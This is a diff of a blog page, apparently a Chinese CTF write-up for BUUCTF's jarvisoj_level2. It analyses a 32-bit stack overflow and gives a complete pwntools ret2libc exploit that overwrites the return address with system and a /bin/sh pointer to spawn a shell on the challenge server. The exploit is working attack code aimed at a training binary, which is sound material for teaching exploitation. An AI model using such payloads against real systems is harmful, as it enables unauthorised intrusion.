@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/jarvisoj-level2-ret2libc/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,21 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj_level2 32位 ret2libc 栈溢出">
+<meta property="og:url" content="http://example.com/2026/05/09/jarvisoj-level2-ret2libc/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T20:28:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="32位">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="栈传参">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +114,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            jarvisoj_level2 32位 ret2libc 栈溢出 | Bear
         
     </title>
 
@@ -416,13 +423,272 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">jarvisoj_level2 32位 ret2libc 栈溢出</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 20:28</span>
+        <span class="mobile">2026-05-09 20:28</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/32%E4%BD%8D/">32位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2libc/">ret2libc</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ROP/">ROP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E4%BC%A0%E5%8F%82/">栈传参</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>BUUCTF 经典题 | 32位函数调用约定与 ROP 链构造</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>题目名称</td>
+<td>jarvisoj_level2 (BUUCTF)</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>32位 Linux ELF (i386)</td>
+</tr>
+<tr>
+<td>保护机制</td>
+<td>NX 开启，无 Canary，无 PIE</td>
+</tr>
+<tr>
+<td>核心考点</td>
+<td>栈溢出、32位栈传参、基础 ROP 链构造</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><h3 id="阶段一：线索收集-main-函数"><a href="#阶段一：线索收集-main-函数" class="headerlink" title="阶段一：线索收集 (main 函数)"></a>阶段一：线索收集 (main 函数)</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call    vulnerable_function       ; 跳转到漏洞函数</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset aEchoHelloWorld    ; &quot;echo &#x27;Hello World!&#x27;&quot;</span><br><span class="line">call    _system                   ; 调用 system()</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>关键发现</strong>：<code>main</code> 函数调用了 <code>system</code> 函数，意味着 <code>system</code> 已在 PLT 中，可直接调用。程序数据段通常也预留了 <code>/bin/sh</code> 字符串。</p>
+<h3 id="阶段二：漏洞定位"><a href="#阶段二：漏洞定位" class="headerlink" title="阶段二：漏洞定位"></a>阶段二：漏洞定位</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buf= byte ptr -88h      ; buf 距离 ebp 偏移 -0x88 (136字节)</span><br><span class="line">push    100h            ; 最大读取长度：0x100 (256字节)</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax</span><br><span class="line">call    _read           ; 触发栈溢出</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>偏移量计算</strong>：</p>
+<ul>
+<li>填满 buf：<code>0x88</code> &#x3D; 136 字节</li>
+<li>覆盖 Saved ebp：4 字节</li>
+<li><strong>总 Padding：136 + 4 &#x3D; 140 字节</strong></li>
+</ul>
+<h2 id="0x03-漏洞利用思路：32位-ROP-链构造"><a href="#0x03-漏洞利用思路：32位-ROP-链构造" class="headerlink" title="0x03 漏洞利用思路：32位 ROP 链构造"></a>0x03 漏洞利用思路：32位 ROP 链构造</h2><p>与 64 位程序使用寄存器传参不同，<strong>32 位程序通过栈传递参数</strong>。</p>
+<p>当劫持程序执行 <code>system(&quot;/bin/sh&quot;)</code> 时，必须在栈上手动伪造函数调用栈帧：</p>
+<p><strong>32 位函数伪造调用栈结构</strong>：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[140字节 Padding] + [system_addr] + [fake_return_addr] + [binsh_addr]</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>system_addr</code>：覆盖原返回地址</li>
+<li><code>fake_return_addr</code>：system 执行完后的返回地址（随便填 4 字节垃圾）</li>
+<li><code>binsh_addr</code>：system 的第一个参数</li>
+</ul>
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28036</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 pwntools 自动寻找目标地址</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Found system() at: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Found &#x27;/bin/sh&#x27; at: <span class="subst">&#123;<span class="built_in">hex</span>(binsh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 32 位栈传参 Payload</span></span><br><span class="line">offset = <span class="number">136</span> + <span class="number">4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)     <span class="comment"># 伪造的返回地址</span></span><br><span class="line">payload += p32(binsh_addr)     <span class="comment"># system() 的第一个参数</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-核心考点"><a href="#0x05-核心考点" class="headerlink" title="0x05 核心考点"></a>0x05 核心考点</h2><ul>
+<li><strong>32 位栈传参</strong>：参数通过栈传递，需手动伪造完整栈帧</li>
+<li><strong>PLT 表利用</strong>：<code>main</code> 调用了 <code>system</code>，可直接使用 <code>elf.plt[&#39;system&#39;]</code></li>
+<li><strong>字符串搜索</strong>：<code>next(elf.search(b&#39;/bin/sh&#39;))</code> 自动查找 <code>/bin/sh</code> 地址</li>
+<li><strong>偏移计算</strong>：<code>buf(136) + saved_ebp(4) = 140</code> 字节</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> jarvisoj_level2 32位 ret2libc 栈溢出</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 20:28:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/jarvisoj-level2-ret2libc/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/32%E4%BD%8D/">#32位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2libc/">#ret2libc</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ROP/">#ROP</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E4%BC%A0%E5%8F%82/">#栈传参</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/09/warmup-csaw-2016/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">warmup_csaw_2016 栈溢出与栈对齐踩坑</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/rip-ret2text-leak/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">rip 自带地址泄露的 ret2text</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">jarvisoj_level2 32位 ret2libc 栈溢出</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">0x02 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%9A%E7%BA%BF%E7%B4%A2%E6%94%B6%E9%9B%86-main-%E5%87%BD%E6%95%B0"><span class="nav-text">阶段一：线索收集 (main 函数)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%8C%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="nav-text">阶段二：漏洞定位</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A32%E4%BD%8D-ROP-%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-text">0x03 漏洞利用思路：32位 ROP 链构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x05 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +726,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +866,7 @@
         }),
     );
 </script>
+
 
 
 
